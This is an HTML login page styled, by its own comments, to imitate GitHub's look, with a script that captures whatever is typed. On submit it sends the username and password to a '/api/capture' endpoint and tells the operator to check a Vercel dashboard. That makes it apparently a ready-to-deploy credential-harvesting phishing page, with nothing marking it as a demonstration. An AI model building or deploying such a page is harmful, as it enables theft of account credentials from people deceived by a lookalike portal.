<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Portal Login</title>
    <style>
        /* Reset & Base */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Professional Dark Abstract Background */
            background: radial-gradient(circle at top left, #1a202c, #0d1117 60%, #000000);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #c9d1d9; /* GitHub text color */
        }

        /* Glassmorphism Card */
        .login-card {
            background: rgba(22, 27, 34, 0.65); /* Semi-transparent dark bg */
            backdrop-filter: blur(12px); /* The frosted glass effect */
            -webkit-backdrop-filter: blur(12px);
            padding: 40px;
            border-radius: 12px;
            width: 100%;
            max-width: 380px;
            
            /* Subtle border for glass edge definition */
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        }

        h2 {
            text-align: center;
            margin-bottom: 24px;
            color: #ffffff; /* White text for contrast */
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.5px;
        }

        .input-group {
            margin-bottom: 18px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            color: #8b949e; /* GitHub muted text */
            font-size: 14px;
            font-weight: 500;
        }

        .input-group input {
            width: 100%;
            padding: 10px 12px;
            background-color: #0d1117; /* Dark input bg */
            border: 1px solid #30363d; /* GitHub border color */
            border-radius: 6px;
            color: #c9d1d9;
            font-size: 14px;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
        }

        .input-group input:focus {
            outline: none;
            border-color: #58a6ff; /* GitHub blue focus */
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.15); /* Subtle glow */
        }

        .btn {
            width: 100%;
            padding: 10px 16px;
            background-color: #238636; /* GitHub Green Button */
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s ease;
            margin-top: 10px;
        }

        .btn:hover {
            background-color: #2ea043; /* Lighter green on hover */
        }
    </style>
</head>

<body>
    <div class="login-card">
        <h2>Account Login</h2>
        <form id="loginForm">
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" id="username" required autocomplete="off">
            </div>
            <div class="input-group">
                < label for="password">Password</label>
                <input type="password" id="password" required autocomplete="off">
            </div>
            <button type="submit" class="btn">Log In</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const usernameVal = document.getElementById('username').value;
            const passwordVal = document.getElementById('password').value;

            try {
                const response = await fetch('/api/capture', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        user: usernameVal,
                        pass: passwordVal
                    })
                });

                if (response.ok) {
                    alert('Request logged. Check Vercel Dashboard!');
                    document.getElementById('loginForm').reset();
                } else {
                    alert('Error payload status: ' + response.status);
                }
            } catch (err) {
                console.error('Network execution failure:', err);
            }
        });
    </script>
</body>

</html>
